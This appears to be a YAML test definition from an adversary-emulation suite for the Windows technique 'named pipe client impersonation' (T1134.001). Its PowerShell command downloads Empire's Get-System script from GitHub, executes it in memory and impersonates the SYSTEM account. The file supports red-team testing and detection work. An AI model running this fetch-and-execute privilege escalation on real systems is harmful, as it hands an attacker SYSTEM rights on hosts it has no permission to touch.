- id: 89409ec9-a874-5b51-914a-44ad3f08b809
  name: Soumaia ART Tests - Named pipe client impersonation
  description: 'Uses PowerShell and Empire''s [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script creates a named pipe, and a service that writes to that named pipe. When the service connects to the named pipe, the script impersonates its security context.

    When executed successfully, the test displays the domain and name of the account it''s impersonating (local SYSTEM).


    Reference: https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/ (requires elevation)'
  tactic: stealth
  technique:
    attack_id: T1134.001
    name: 'Access Token Manipulation: Token Impersonation/Theft'
  platforms:
    windows:
      psh:
        command: |-
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose
